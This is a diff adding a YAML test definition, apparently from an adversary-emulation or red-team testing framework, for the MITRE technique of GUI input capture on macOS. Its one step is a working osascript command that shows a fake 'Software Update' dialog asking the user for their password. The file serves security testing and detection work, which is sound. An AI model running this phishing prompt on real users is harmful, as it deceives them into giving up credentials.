@@ -1,0 +1,25 @@
+api_version: "2.0"
+name: AppleScript - Prompt User for Password
+description: |
+    Prompt User for Password (Local Phishing)
+    Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
+uuid: 76628574-0bc1-4646-8fe2-8f4427b47d15
+mitre:
+    tactics:
+        - 'TA0009: Collection'
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1056: Input Capture'
+    subtechniques:
+        - 'T1056.002: GUI Input Capture'
+requirements:
+    platforms:
+        - os: macos
+steps:
+    - name: applescript---prompt-user-for-password
+      inline: |
+        osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
+      executor: bash
+      cleanup:
+        inline: ""
+        executor: bash
